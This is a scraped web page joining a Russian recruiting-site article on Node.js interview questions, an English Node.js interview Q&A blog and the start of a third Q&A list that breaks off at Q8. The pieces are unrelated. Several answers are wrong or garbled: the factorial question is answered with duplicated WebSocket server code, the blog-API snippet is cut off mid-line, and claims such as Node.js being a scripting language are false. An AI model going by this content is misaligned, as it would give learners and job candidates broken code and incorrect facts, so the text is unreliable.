Как можно интегрировать Memcached в Node.js? Memcached — это система кэширования в памяти, которая используется для ускорения веб-сайтов путем хранения данных и объектов в оперативной памяти. Для интеграции Memcached в Node.js, вы можете использовать сторонние библиотеки, такие как memcached или node-memcached, которые предоставляют удобный API для взаимодействия с Memcached-сервером. Вы также должны установить и настроить Memcached-сервер на вашем хосте или использовать облачные сервисы, которые предоставляют Memcached.
Что такое модуль child_process? Модуль child_process в Node.js используется для создания и управления дочерними процессами. Дочерние процессы — это независимые исполняемые процессы, которые могут выполняться параллельно с основным процессом Node.js. Это позволяет выполнить внешние команды, запустить другие Node.js-приложения или даже создать многозадачные приложения.
Что такое «Callback Hell» и как с ним бороться? «Callback Hell» (или «ад обратных вызовов») — это анти-шаблон в асинхронном программировании, когда множество вложенных обратных вызовов делает код сложным для чтения и поддержки. Чтобы бороться с ним, можно применять следующие методы:
Разбивать функции на более мелкие именованные функции, чтобы улучшить читаемость кода.
Использовать промисы и async/await, чтобы управлять асинхронными операциями более легко и последовательно.
Использовать библиотеки управления потоком, такие как async или bluebird, чтобы управлять обратными вызовами более эффективно.
Как можно хешировать строку с использованием функции md5? Для хеширования строки с использованием функции md5 в Node.js, вы можете воспользоваться модулем crypto. Вот пример:
javascriptCopy code

const crypto = require(‘crypto’); let message = «I love node and express.js»; let hash = crypto.createHash(‘md5’).update(message).digest(«hex»); console.log(hash); 

Этот код создаст MD5-хеш от строки message и выведет его в шестнадцатеричном формате.


Заключение
Проведение успешного интервью с кандидатами для позиции Node.js разработчика требует хорошего понимания основ этой технологии и умения задавать релевантные вопросы. Наши вопросы и ответы предоставляют базовую основу для определения технических знаний и навыков кандидата, а также его способности решать сложные задачи в асинхронной среде.

Не забывайте, что поиск it-специалистов может быть вызовом, но вы можете облегчить этот процесс, обратившись к платформам, таким как Jobers. Jobers предоставляет доступ к широкому кругу специалистов и помогает свести время поиска кандидатов к минимуму, чтобы вы могли сфокусироваться на развитии вашего проекта и бизнеса. Не забывайте использовать все доступные ресурсы, чтобы собрать сильную команду и достичь успеха в разработке приложений на Node.js.


ОСТАВИТЬ ЗАЯВКУ
Смотрите также

5 мин
3637196
04.08.2024
Как определить цель компании
Правильно определённая цель может стать рулевым колесом, которое направит ваш бизнес к успеху в штормовом море рыночной конкуренции.

Читать статью

5 мин
3346334
04.08.2024
Как создать и зачем нужна корпоративная база знаний
Этот инструмент превращает информационный хаос в организованную систему, где каждая важная деталь доступна в пару кликов. Это не только экономит время, но и снижает стресс у вашей команды, ведь теперь они точно знают, где и что искать.

Читать статью

5 мин
3331811
04.08.2024
Как разработать оргструктуру компании
Этот инструмент превращает информационный хаос в организованную систему, где каждая важная деталь доступна в пару кликов. Это не только экономит время, но и снижает стресс у вашей команды, ведь теперь они точно знают, где и что искать.

Читать статью

5 мин
3698352
04.08.2024
Теория ожидания Врума
Понимание того, что движет вашими сотрудниками, может стать вашим мощным инструментом в управлении командой. Именно здесь на помощь приходит теория ожидания Виктора Врума, один из фундаментальных подходов в психологии мотивации, который помогает расшифровать, как и почему ваша команда работает так, как работает.

Читать статью

4 мин
3692656
03.08.2024
Аудит человеческих ресурсов
Подумайте об этом как о стратегическом инструменте, который не только выявляет проблемы, но и предлагает конкретные пути их решения. Это возможность переосмыслить процессы, которые кажутся обыденными, но на деле могут таить в себе ключ к более продуктивной рабочей атмосфере.

Читать статью

3 мин
4370828
23.07.2024
Профиль должности маркетолога
Маркетолог — это много больше, чем просто креативный ум, погружённый в мир рекламы и соцсетей. Это стратег, который каждый день стоит у руля вашего бренда, направляя его через бурные воды рыночной конкуренции.

Читать статью

3 мин
4357062
23.07.2024
Профиль должности бухгалтера
Задумывались ли вы когда-нибудь, что стоит за спокойствием и уверенностью вашего предприятия в финансовом плане? Правильный ответ — ваш бухгалтер. Это специалист, который не только следит за каждым рублем в бюджете, но и защищает ваш бизнес от финансовых рисков.

Читать статью

3 мин
4344191
23.07.2024
Профиль должности администратора
Администратор — это многофункциональный организатор и первое лицо компании для ваших клиентов и партнеров. Это человек, который знает всё о том, как устроены ваши процессы, и способен управлять ими одним движением руки.

Читать статью

3 мин
4331662
23.07.2024
Профиль должности hr-менеджера
Если вы до сих пор не задумывались о значении этой роли, то пришло время взглянуть на профиль должности HR-менеджера под новым углом. От того, насколько грамотно организована работа вашего HR, зависит не только атмосфера в коллективе, но и его способность достигать амбициозных целей. 

Читать статью

3 мин
4318456
23.07.2024
Профиль должности инженера
Инженеры — это не просто специалисты в своем деле, это строители будущего в буквальном смысле этого слова. Вашему вниманию предлагается статья, которая раскроет вам все тонкости профиля должности инженера.

Читать статью
начните сейчас

Звоните, поможем быстро найти сотрудников

8 (800) 707-63-78
Max
Telegram

Сервис публикации вакансий

Реквизиты

ООО «ЭЙЧАР-СОФТ», ИНН: 7805815915 198035, г. Санкт-Петербург, вн.тер.г. Муниципальный Округ Морские Ворота, ул Двинская, д. 10, к. 2, литера А, помещ. 16-Н 8(800) 707-63-78
Код вида деятельности: 1.01, 2.01
Основной ОКВЭД: 62.01

Ваш регион

Москва
Закрывающие документы:

buh@jobers.ru
Отдел продаж:

8(800) 707-63-78
sales@jobers.ru
В реестре
российского ПО

  
© 2016-2026 Jobers.ru

Продукты

Публикация вакансий
Публикация во Вконтакте
Публикация в Telegram
Рерайтинг вакансии
Сервис

Контакты
Способы оплаты
Отзывы
О компании
Наши партнеры
Аккредитация
Документы

Политика конфиденциальности
Оферта
Правила использования сайта
Правила размещения
Использование cookies
Стоимость ПО
Описание ПО
Требования к ПО
Функциональные характеристики




Node.js Interview Questions and Answers
By Ayaan Alam
|
Last updated on January 14, 2026
|
89555 Views
 
PreviousNext 
Table of content
Node JS Interview Questions for Freshers
Node JS Interview Questions for Experienced 2 to 5 Years
Node JS Interview Questions 6 to 10 Years Experience
Node.js Coding Interview Questions
Node JS Tricky Interview Questions
The number of Node.js jobs is on the rise, and this puts you up against increased competition. This calls for the most in-depth preparation you can get. This top Node.js interview questions and answers blog is carefully curated to give you answers to some of the most frequently asked questions in a Node.js interview. This blog contains all the frequently asked interview questions from node js basic interview questions to node js coding interview questions which can help you crack your next node js job interview!

Most Frequently Asked Node Js Interview Questions

Briefly explain the working of Node.js.
Where is Node.js used?
What is the difference between synchronous and asynchronous functions?
Why is Node.js so popular these days?
Explain the event-driven architecture of Node.js
How do you handle errors in Node.js?
Why is Node.js single-threaded?
What is the framework that is used most often in Node.js today?
What is an event loop in Node.js?
What is the order of execution in control flow statements?
Node.js Interview Questions for Freshers
1. What is the difference between Node.js and JavaScript?
Factor	Node.js	JavaScript
Engine	V8 – Google Chrome	V8, Spider Monkey, and JS Core
Usage	To perform non-blocking activities	For general client-side operations
Working	Interpreter – Scripting	Programming language
2. What is Node.js?
Node.js is a very popular scripting language that is primarily used for server-side scripting requirements. It has numerous benefits compared to other server-side programming languages out there, the most noteworthy one being the non-blocking I/O.

3. Briefly explain the working of Node.js.
Node.js is an entity that runs in a virtual environment, using JavaScript as the primary scripting language. It uses a simple V8 environment to run on, which helps in the provision of features like the non-blocking I/O and a single-threaded event loop.

4. Where is Node.js used?
Node.js is used in a variety of domains. But, it is very well regarded in the design of the following concepts:

Network application
Distributed computing
Responsive web apps
Server-Client applications
5. What is the difference between Node.js and Angular?
Node.js	Angular
Used in situations where scalability is a requirement	Best fit for the development of real-time applications
Ability to generate queries in a database	Ability to simplify an application into the MVC architecture
Mainly used to develop small/medium-sized applications	Mainly used to develop real-time interactive web applications
Provides many frameworks such as Sails, Partial, and Express	Angular is an all-in-one web app framework
Coded using C++ and JavaScript	Coded in TypeScript
Check out the top Node.js interview questions and answers:

Video Thumbnail
6. What is the difference between synchronous and asynchronous functions?
Synchronous functions are mainly used for I/O operations. They are instantaneous in providing a response to the data movement on the server and keeping up with the data as per the requirements. If there are no responses, the API will throw an error.

On the other hand, asynchronous functions, as the name suggests, work on the basis of not being synchronous. Here, HTTP requests, when pushed, will not wait for a response to begin. Responses to any previous requests will be continuous, even if the server has already gotten the response.

Next among the Node JS questions, you have to learn about the control flow function.

Get 100% Hike!

Master Most in Demand Skills Now!

Email Address

+91  IN          INDIA
Phone Number
By providing your contact details, you agree to our Terms of Use & Privacy Policy
7. What is the control flow function?
The control flow function is a common code snippet, which executes whenever there are any asynchronous function calls made. It is used to evaluate the order in which these functions are executed in Node.js.

8. Why is Node.js so popular these days?
Node.js has gained an immense amount of traction as it mainly uses JavaScript. It provides programmers with the following options:

Writing JavaScript on the server
Access to the HTTP stack
File I/O entities
TCP and other protocols
Direct database access
9. Are there any disadvantages to using Node.js?
A multi-threaded platform can run more effectively and provide better responsiveness when it comes to the execution of intensive CPU computation, and the usage of relational databases with Node.js is already becoming obsolete.

10. Explain the event-driven architecture of Node.js
Node.js follows an event-driven architecture where asynchronous operations are managed through event loops. It uses callback functions to handle events and execute non-blocking I/O operations efficiently.

11.What is npm? How do you install packages using npm?
npm stands for Node Package Manager. It is a package manager for Node.js that is used to install and share packages/modules. To install packages, you use the “npm install” command followed by the package name. For example, “npm install express” installs the Express framework

12.How do you create a basic HTTP server in Node.js?
<br>
const http = require(‘http’);
const <a href="https://intellipaat.com/blog/tutorial/sql-server-tutorial/" target="_blank">server</a> = http.createServer((req, res) => {
res.writeHead(200, {‘Content-Type’: ‘text/plain’});
res.end(‘Hello, World!’);
});
server.listen(3000, () => {
console.log(‘Server running at http://localhost:3000/’);
});
13. Explain the difference between callbacks and promises in Node.js.
Callbacks are functions passed as arguments to other functions and executed asynchronously once an operation is completed. 

Promises represent the eventual completion (or failure) of an asynchronous operation and allow the chaining of asynchronous actions.

14. What is the purpose of the package.json file?
The package.json file contains metadata about a Node.js project, including its configuration settings like dependencies, scripts, version, author, etc. It is used by npm to manage project dependencies.

15. How do you handle errors in Node.js?
Errors in Node.js can be handled using “try-catch” blocks for synchronous code and “.catch()” method for promises. Additionally, you can use error-handling middleware in frameworks like Express to handle errors in middleware and route handlers.

16. Explain the role of the “require” function in Node.js.
The require() function is used in Node.js to import modules or files. It loads the module at runtime and returns its “exports” object, allowing you to access its functionality within your code.

17. How do you debug Node.js applications?
Node.js applications can be debugged using built-in debugging tools like “console.log()” statements, the Node.js debugger (node inspect), or using third-party debugging tools like Visual Studio Code with breakpoints.

Node.js Interview Questions for Experienced 2 to 5 Years
18. Why is Node.js single-threaded?
Node.js works on the single-threaded model to ensure that there is support for asynchronous processing. With this, it makes it scalable and efficient for applications to provide high performance and efficiency under high amounts of load.

19. What are the different API functions supported by Node.js?
There are two types of API functions. They are as follows:

Synchronous APIs: Used for blocking functions
Asynchronous APIs: Used for non-blocking functions
20. What is the framework that is used most often in Node.js today?
Node.js has multiple frameworks, namely:

Hapi.js
Express.js
Sails.js
Meteor.js
Derby.js
Adonis.js
Among these, the most used framework is Express.js for its ability to provide good scalability, flexibility, and minimalism.

21. What are the security implementations that are present in Node.js?
The following are the important implementations for security:

Error handling protocols
Authentication pipelines
Node JS Interview Questions for 2 to 5 Years Experience
22. What is an event loop in Node.js?
When running an application, callbacks are entities that have to be handled. In the case of Node.js, event loops are used for this purpose. Since Node.js supports non-blocking sending, this is a very important feature to have.

The working of an event loop begins with the occurrence of a callback wherever an event begins. This is usually run by a specific listener. Node.js will keep executing the code after the functions have been called, without expecting the output prior to the beginning.

Once all of the code is executed, outputs are obtained, and the callback function is executed. This works in the form of a continuous loop, hence the name event loop.

23. What are the asynchronous tasks that should occur in an event loop?
Following are some of the tasks that can be done using an event loop asynchronously:

Blocking send requests
High computational requirement
Real-time I/O operations
24. What is the order of execution in control flow statements?
The following is the order in which control flow statements are used to process function calls:

Handling execution and queue
Data collection and storage
Concurrency handling and limiting
Execution of the next piece of code
25. What are the input arguments for an asynchronous queue?
There are two main arguments that an asynchronous queue uses. They are as follows:

Concurrency value
Task function
26. What is the primary reason to use the event-based model in Node.js?
The event-based model in Node.js is used to overcome the problems that occur when using blocking operations in the I/O channel.

Next in this blog comprising Node.js questions, you need to understand how you can import libraries into Node.js.

27. How can you import external libraries into Node.js?
External libraries can be easily imported into Node.js using the following command:

var http=require (“http”)
This command will ensure that the HTTP library is loaded completely, along with the exported object.

Next, among the Node JS questions you need to know about event-driven programming.

28. What is meant by event-driven programming in Node.js?
Event-driven programming is a technique in which the workflow execution of a program is mainly controlled by the occurrence of events from external programs or other sources.

The event-driven architecture consists of two entities, namely:

Event handling
Event selection
29. What is the difference between Ajax and Node.js?
Ajax	Node.js
Client-side programming technology	Server-side scripting language
Executes in the browser	Executes on the server
Next, in this compilation of top Node.js interview questions, let’s check out the intermediate category of questions.

30. What are streams in Node.js?
Streams are a set of data entities in Node.js. These can be considered similar to the working of strings and array objects. Streams are used for continuous read/write operations across a channel. But, if the channel is unavailable, all the data cannot be pushed to the memory at once. Hence, using streams will make it easy to process a large set of data in a continuous manner.

Next up on this compilation of top Node.js interview questions for experienced, let’s check out the advanced category of questions.

31. How do you handle file operations in Node.js?
File operations in Node.js can be performed using the built-in “fs” module. You can use operations like fs.readFile(), fs.writeFile(), fs.mkdir(), or fs.unlink() to read, write, create directory, and delete files, respectively. We can also perform other file-related operations.

32. Explain the concept of middleware in Express.js.
Middleware in Express.js are functions that have access to the request (req), response (res), and next middleware function in the application’s request-response cycle. They can modify request and response objects, execute code, and terminate the request-response cycle.

33. What are the advantages of using Node.js for backend development?
Some of the advantages of using Node.js for backend development are as follows:

Non-blocking architecture
Scalability
Large ecosystem of modules and packages
Ability to use JavaScript on both the client and server sides
34. How does clustering work in Node.js and when to use it?
Clustering in Node.js involves spawning multiple instances of the Node.js process to utilize multiple CPU cores effectively. 

It’s used to scale Node.js applications across multiple CPU cores. This improves the performance and concurrency handling

35. What is a RESTful API, and how do you implement it in Node.js?
RESTful API is an architectural style for designing networked applications based on the principles of representational state transfer (REST). 

It uses standard HTTP methods like GET, POST, PUT, and DELETE to perform CRUD operations on resources. In Node.js, you can implement RESTful APIs using frameworks like Express.js by defining routes for different HTTP methods accordingly.

36. Explain the difference between require() and “import” in Node.js.
require() is a CommonJS module system function used to import modules in Node.js. It is synchronous and is used to load modules dynamically at runtime. 
“import” is an ES6 feature for module loading, supported in Node.js with the  “–experimental-modules flag”. It is asynchronous and allows for more granular control over module loading.
37. How do you perform unit testing in Node.js applications?
Unit testing in Node.js applications can be done using testing frameworks like Mocha, Jest, or Jasmine. You write test cases to verify individual units of code. Testing can be done by providing inputs and asserting expected outputs.

38. What is the meaning of a test pyramid?
A test pyramid is a methodology that is used to denote the number of test cases executed in unit testing, integration testing, and combined testing (in that order). This is maintained to ensure that an ample number of test cases are executed for the end-to-end development of a project.

39. What is the difference between spawn and fork methods in Node.js?
The spawn() function is used to create a new process and launch it using the command line. It creates a node module on the processor. Node.js invokes this method when the child processes return data.

The following is the syntax for the spawn() method:

child_process.spawn(command[, args][, options])
Coming to the fork() method, it can be considered as an instance of the already existing spawn() method. Spawning ensures that there is more than one active worker node to handle tasks at any given point in time.

The following is the syntax for the fork() method:

child_process.fork(modulePath[, args][, options])
40. What is the use of middleware in Node.js?
A middleware is a simple function that has the ability to handle incoming requests and outbound response objects. Middleware is used primarily for the following tasks:

Execution of code (of any type)
Updating request and response objects
Completion of request-response iterations
Calling the next middleware
41. What are global objects in Node.js?
Global objects are objects with a scope that is accessible across all of the modules of the Node.js application. There will not be any need to include the objects in every module. One of the objects is declared as global. So, this is done to provide any functions, strings, or objects access across the application.

Next among the Node JS coding questions, you need to take a look at the usage of assets in Node JS.

42. Why is assert used in Node.js?
Assert is used to explicitly write test cases to verify the working of a piece of code. The following code snippet denotes the usage of assert:

var assert = require('assert');<br>
function add(x, y) {<br>
return x + y;<br>
}<br>
var result = add(3,5);<br>
assert( result === 8, 'three summed with five is eight');
43. How is a test pyramid implemented using the HTML API in Node.js?
Test pyramids are implemented by defining the HTML API. This is done using the following:

A higher number of unit test cases
A smaller number of integration test methods
A fewer number of HTTP endpoint test cases
44. Why is Express.js used?
Node JS Express is a widely used framework built using Node.js. Express.js uses a management point that controls data flow between servers and server-side applications.

Being lightweight and flexible, Express.js provides users with lots of features used to design mobile applications.

45. What are “Event Emitters” in Node.js and also provide examples of their usage?
Event emitters are objects that let code subscribe to named events. When those events happen, the emitter runs the subscribed callbacks. Some core Node.js modules use emitters. For example, HTTP and filesystem modules emit events about responses and file reads. This allows handling many concurrent requests without blocking, enabling Node’s asynchronous, non-blocking nature.

46. How do you handle authentication in Node.js applications?
Authentication in Node.js applications can be handled using middleware like Passport.js, JSON Web Tokens (JWT), or OAuth. Users are authenticated based on their credentials.
47. What are worker threads in Node.js, and when would you use them?
Worker threads in Node.js help you run JavaScript code in separate threads. This is usually used to perform CPU-intensive tasks seamlessly without blocking the event loop.

48. Explain the purpose of the “process” module in Node.js.
The “process” module in Node.js lets you control how your Node.js application runs. It helps you access many things, like environment settings, command-line info, and ways to manage your program

49. How do you optimize the performance of Node.js applications?
Performance optimization in Node.js involves various strategies, such as: 

Minimizing blocking I/O operations
Optimizing algorithms
Caching frequently accessed data
Implementing clustering for multi-cores
50. What is GraphQL?
GraphQL is a query language for APIs that allows clients to request only the data they require.

51. How do you deploy Node.js applications to production environments?
Node.js applications can be deployed to production environments by using various deployment strategies. These strategies include

Containerization with Docker
Deploying to cloud platforms 
Using platform-as-a-service (PaaS) providers 
Setting up self-managed servers as reverse proxies
52. Explain the use of “Passport.js” in Node.js applications.
“Passport.js” is a middleware. It is used in Node.js applications for implementing authentication strategies. It provides a flexible way to authenticate users.

Node.js Interview Questions for 6 to 10 Years Experience
53. What are stubs in Node.js?
Stubs are simply functions that are used to assess and analyze individual component behavior. When running test cases, stubs are useful in providing the details of the functions executed.

54. What is the use of the connect module in Node.js?
The connect module in Node.js is used to provide communication between Node.js and the HTTP module. This also provides easy integration with Express.js, using the middleware modules.

55. What are the types of streams available in Node.js?
Node.js supports a variety of streams, namely:

Duplex (both read and write)
Readable streams
Writable streams
Transform (duplex for modifying data)
56. What is the use of REPL in Node.js?
REPL stands for Read-Eval-Print-Loop. It provides users with a virtual environment to test JavaScript code in Node.js.

To launch REPL, a simple command called ‘node’ is used. After this, JavaScript commands can be typed directly into the command line.

57. What is meant by tracing in Node.js?
Tracing is a methodology used to collect all of the tracing information that gets generated by V8, the node core, and the userspace code. All of these are dumped into a log file and are very useful to validate and check the integrity of the information being passed.

58. Where is package.json used in Node.js?
The ‘package.json’ file is a file that contains the metadata about all items in a project. It can also be used as a project identifier and deployed as a means to handle all of the project dependencies.

59. What is the difference between readFile and createReadStream in Node.js?
readFile: This is used to read all of the contents of a given file in an asynchronous manner. All of the content will be read into the memory before users can access it.
create ReadStream: This is used to break up the field into smaller chunks and then read it. The default chunk size is 64 KB, and this can be changed as per requirement.
60. What is the purpose of the crypto module in Node.js?
The crypto module in Node.js is used to provide users with cryptographic functionalities. This provides them with a large number of wrappers to perform various operations such as ciphering, deciphering, signing, and hashing.

61. What is a passport in Node.js?
Passport is a widely used middleware present in Node.js. It is primarily used for authentication, and it can easily fit into any Express.js–based web application.

With every application created, it will require unique authentication mechanisms. This is provided as single modules by using a passport, and it becomes easy to assign strategies to applications based on requirements, thereby avoiding any sort of dependencies.

Become a Full Stack Web Developer

62. What is the use of EventEmitter in Node.js?
Every single object in Node.js that emits is nothing but an instance of the EventEmitter class. These objects have a function that is used to allow the attachment between the objects and the named events.

Synchronous attachments of the functions are done when the EventEmitter object emits an event.

63. Why do you think you are the right fit for this Node.js role?
Here, the interviewer wants to know your understanding of the job role, the company architecture, and your knowledge of the topic. While answering this question, it will be helpful if you know the job description in detail and the basic usage of the technology in the company. The answer can be further elaborated on depending on how your interests align with the technology, job, and company.

64. Do you have any past Node.js work experience?
This question is common in Node.js interviews. Make sure to answer it to the best of your abilities, and do not bloat, but give your honest experiences and explain how you’ve used Node.js before. This is used as a measure to see if you have had any hands-on experience with the language in a working environment before.

65. Do you have any experience working in the same industry as ours?
With this question, the interviewer is trying to assess if you’ve had any previous work experience or internship experience where you dealt with similar working environments or technologies. This line of questioning can be easily answered based on your previous experiences. Make sure to keep it concise and detailed, as required, when answering this question.

66. Do you have any certifications to boost your candidacy for this Node.js role?
It is always advantageous to have a certification in the technology that you’re applying for. This gives the interviewer the impression that you have worked on the technology and that you are serious about using it for your career growth. More than this, it adds immense value to your resume and your knowledge on the topic at the same time.

67. What is a V8 engine?
The V8 engine is an open-source JavaScript engine developed by Google. It is used to execute JavaScript code in web browsers and Node.js.

68. Explain the concept of garbage collection in Node.js.
Garbage collection in Node.js is the automatic process of reclaiming memory occupied by objects that are no longer needed by the application. The V8 engine’s garbage collector frees up memory used by unreachable objects, which improves memory management.

69. How do you handle memory leaks in long-running Node.js applications?
Memory leaks in long-running Node.js applications can be handled by monitoring memory usage. It analyzes heap snapshots with tools like Node.js built-in “–inspect flag”. This optimizes memory usage.

70. Discuss the architecture of a microservices-based Node.js application.
A microservices-based Node.js application architecture decomposes the application into small, independently deployable services. Each one is responsible for a specific business function. These services communicate over lightweight protocols like HTTP or messaging queues.

71. What are the differences between WebSocket and HTTP in Node.js?
WebSocket is a protocol that provides full-duplex communication channels over a single TCP connection. It is used for real-time, bidirectional communication between clients and servers. 

HTTP, on the other hand, is a request-response protocol used for traditional client-server communication. Each request is initiated by the client and responded to by the server.

72. Explain the use of PM2 in Node.js for process management.
PM2 is a process manager for Node.js applications that provides features like 

Process monitoring
Automatic restarts
Log management
Clustering 
Production-ready deployment
73. How do you ensure high scalability in Node.js applications?
High scalability in Node.js applications can be ensured by using techniques like 

load balancing
horizontal scaling with clustering
fault tolerance
caching
database sharding
74. Discuss the use of Redis in caching and session management with Node.js.
Redis is an in-memory data store used for caching and session management. It provides fast read/write operations for data structures. These data structures include strings, hashes, lists, sets, and sorted sets.

Node.js Coding Interview Questions
75. How does the DNS lookup function work in Node.js?
The DNS lookup method uses a web address as its parameter and returns the IPv4 or IPv6 record, correspondingly.

There are other parameters, such as the options used to set the input as an integer or an object. If nothing is provided here, both IPv4 and IPv6 are considered. The third parameter is for the callback function.

The syntax is as follows:

dns.lookup(address, options, callback)
76. How to get information about a file in Node.js?
The fs.stat function is used to get the required information from a file.

The syntax is as follows:

fs.stat(path, callback)
Here,

Path: The string that has the path to the name.
Callback: The callback function where stats is an object of fs.stats
77. Implement a function to reverse a string in Node.js.
<br>
function reverseString(str) {
return str.split(”).reverse().join(”);
}<br>
78.Write a program to read a JSON file and parse its contents in Node.js.
<br>
const fs = require(‘fs’);
fs.readFile(‘data.json’, ‘utf8’, (err, data) => {<br>
if (err) throw err;<br>
const json = JSON.parse(data);<br>
console.log(json);<br>
});<br>
79. Create a simple Express.js application to handle GET and POST requests.
<br>
const express = require(‘express’);<br>
const app = express();
app.get(‘/’, (req, res) => {<br>
res.send(‘GET request received’);<br>
});
app.post(‘/’, (req, res) => {<br>
res.send(‘POST request received’);<br>
});
app.listen(3000, () => {<br>
console.log(‘Server running on port 3000’);<br>
});<br>
80. Implement a basic authentication middleware in Node.js using Express.
<br>
function authenticate(req, res, next) {<br>
const token = req.headers[‘authorization’];<br>
if (token === ‘secretToken’) {<br>
next();<br>
} else {<br>
res.status(401).send(‘Unauthorized’);<br>
}<br>
}
app.use(authenticate);<br>
81. Write a program to fetch data from an external API and display it in a Node.js application.
<br>
const axios = require(‘axios’);
axios.get(‘https://api.example.com/data’)<br>
.then(response => {<br>
console.log(response.data);<br>
})<br>
.catch(error => {<br>
console.error(error);<br>
});<br>
82. Develop a RESTful API for a simple blog application using Node.js and Express.
<br>
app.get(‘/posts’, (req, res) => {
});
app.post(‘/posts’, (req, res) =><br>
83. Implement a WebSocket server in Node.js to enable real-time communication.
<br>
const WebSocket = require(‘ws’);
const wss = new WebSocket.Server({ port: 8080 });
wss.on(‘connection’, function connection(ws) {<br>
console.log(‘Client connected’);
ws.on(‘message’, function incoming(message) {<br>
console.log(‘Received:’, message);<br>
ws.send(`Echo: ${message}`);<br>
});
ws.on(‘close’, function close() {<br>
console.log(‘Client disconnected’);<br>
});<br>
});<br>
84. Write a function to calculate the factorial of a number using recursion in Node.js.
<br>
const WebSocket = require(‘ws’);
const wss = new WebSocket.Server({ port: 8080 });
wss.on(‘connection’, function connection(ws) {<br>
console.log(‘Client connected’);
ws.on(‘message’, function incoming(message) {<br>
console.log(‘Received:’, message);
ws.send(`Echo: ${message}`);<br>
});<br>
ws.on(‘close’, function close() {<br>
console.log(‘Client disconnected’);<br>
});<br>
});<br>
Node JS Tricky Interview Questions
85. What is NODE_ENV, and how do you use it in Express?
NODE_ENV is an environment variable frequently utilized in Node.js applications, including those developed with the Express framework. It assists in identifying the current environment of your application, whether it’s for development, production, or testing purposes.

Step 1: Set NODE_ENV

Open a terminal.

Set the “NODE_ENV” environment variable to a specific value, such as “development” or “production”.

For windows,

set NODE_ENV = development

Step 2: Create an Express Application

Install Express if you haven’t already.

npm install express

Create a file named “app.js”. You can use any other name if you want.

Import and create an Express application in the file:

const express = require(‘express’);

const app = express();

Step 3: Configure Environment-Specific Behavior

Based on the value of NODE_ENV, configure different behaviors for different environments.

For example,

<br>
if (process.env.NODE_ENV === ‘production’) {<br>
// You can configure production database connections here<br>
} else {<br>
// You can Configure development/testing database connections here<br>
}<br>
if (process.env.NODE_ENV === ‘production’) {<br>
// You can enable production logging settings here<br>
} else {<br>
// You can enable development logging settings here<br>
}<br>
Step 4: Start the Express Application

Start the Express server by:

<br>
const port = process.env.PORT || 3000;<br>
app.listen(port, () => {<br>
console.log(`Server is running on port ${port} in ${process.env.NODE_ENV} mode`);<br>
});<br>
Step 5: Run the Application

Start your application by:

node app.js

Node JS Developer Salary Trends
The salary of a Node.js developer keeps increasing with time and experience due to the high demand for experienced developers.

Job Role 	Average Salary in India	Average Salary in the USA
Node.js Developer	Minimum -₹1.2 LPA	Minimum –  34,933 USD
Average – ₹5.8 LPA	Average – 57,577 USD
Highest – ₹12 LPA	Highest – 94,900 USD
Node JS Developer Job Trends
A Node.js developer is one of the hottest jobs to get in 2026. 

The demand for Node.js developers is constantly increasing in India. Currently, there are 23,000+ open jobs on Naukri and 22,000+ open jobs on LinkedIn. Both are leading job portals in India. 
Out of these, 7,500+ jobs are entry-level permanent jobs, and approximately 2,000 are internship opportunities.
If you consider the city-wise distribution of jobs, in Bangalore there are 12,300+, in Hyderabad 6,500+, in Pune 5,200+, and in Mumbai 3,800+ openings.
According to LinkedIn, there are currently 42,000+ openings in the USA, with approximately 1,960 recent positions.
Other perks of working on Node.js are as follows:
Work from Home Opportunities
Currently, many top companies like Deloitte, Turing, Infosys, Wipro, etc., are offering Work from Home opportunities for Node.js developers.
High-Paying Salaries
Even if you start at an average-paying job, you will switch to a high-paying job within a year, as there is a high demand for experienced Node developers.
Constant Growth
Node.js development is currently on a rising trend and will be rising in the coming years, as many companies are shifting towards Node.js for full-stack development. These companies include popular names such as Paypal, Walmart, and Netflix.
Node JS Developer Roles & Responsibilities
As a Node.js developer, your primary responsibilities will be designing and developing backend systems, along with building RESTful APIs. You will also be expected to write and maintain code with performance optimization duties.

You can refer to this job posting for a Node.js Application Developer posted by Accenture.

NodeJsApplicationDeveloper

A common tech stack for Node.js developers includes-

Java, Javascript, and all the libraries and frameworks related to it
Backend technologies like Python, PHP, etc.
Front-end technologies like HTML5, React, etc.
Familiarity with cloud platforms like AWS, Azure, etc.
We hope this set of Node.js technical interview questions will help you prepare for your interviews. Best of luck in your endeavors!

What's in it for me?
We have created this section for your convenience from where you can navigate to all the sections of the article. All you need to just click on the desired section, and it will land you there.

Most Frequently Asked Node.js Interview Questions
Top 20 Most Popular Node.js Interview Questions
Advanced Javascript Interview Questions
Most Frequently Asked Node js Interview Questions
Here in this article, we will be listing frequently asked Node js Interview Questions and Answers with the belief that they will be helpful for you to gain higher marks. Also, to let you know that this article has been written under the guidance of industry professionals and covered all the current competencies.

Q1. What is Node.js and why it is used?
Answer
Node.js, as open-source server environment, runs on various platforms such as Windows, Unix, Linux, etc. The anchor of the MEAN stack, Node.js is also one of the most popular server platforms in the world.

Why it is used?
It is asynchronously programming, runs single-threaded, non-blocking which is very memory efficient.
It can operate file various operations like create, open, write, read, delete, and close files on the server and can collect form data.
Q2. What are the advantages of Node JS?
Answer
Scalable and extensible
Easy to learn
Used as a Single Programming Language
Offers benefits of Fullstack JS
Offers High Performance
Q3. Why we used NPM in Node js?
Answer
The NPM provides two main functionalities:

It is the online repository for all of the Node.js packages.
It is the command line utility for installing, version management and dependency management of the Node.js packages.
Q4. How to install Node JS?
Answer
Go to the Nodejs.org site and download the binary files and Windows installer.
Run the Windows installer.
Follow the instructions on the screen for accepting the license agreement, clicking the NEXT button a few times and allowing the default settings.
You will have to restart your computer. Remember that you may not be able to run Node.js until you restart your computer.
Make sure you have installed Node by running simple commands just to see what version got installed.
Related Article: How to install node js
Q5. What is callback function in NodeJS?
Answer
A callback function is done at the completion of a task. This function allows other codes to be run in the meanwhile and prevent blocking. Because Node.js is an asynchronous platform, it relies heavily on the callback function. In addition, the APIs also support callbacks.

Q6. What is package.json?
Answer
package.json is the most important file of any Node.js project and it contains the metadata of the project. It is used to give information to NPM that allows it to identify the project. It handles the project's all dependencies. It is placed on root of any project.

Q7. How can we avoid callbacks?
Answer
We can avoid callback hell by different available solutions, as mentioned below.
Promises: The promise is s result of an asynchronous operation. We can create a promise on these three states:

Pending: When the initial state is not fulfilled or rejected.
Fulfilled: When the operation gets completed successfully.
Rejected: When the operation gets failed.
Generators: These are functions that can be resumed and paused. It doesn’t get executed immediately when called. Instead, it returns a generator object or generator object with which we can control the execution of the function.

Note: After learning the basics of Node, if you are looking for what more to learn, you can start with meta-programming, protocols, and much more. We have created a list of node interview questions to help them use this language to solve complex problems.

Q8. What is the use of REPL in node JS?
Answer
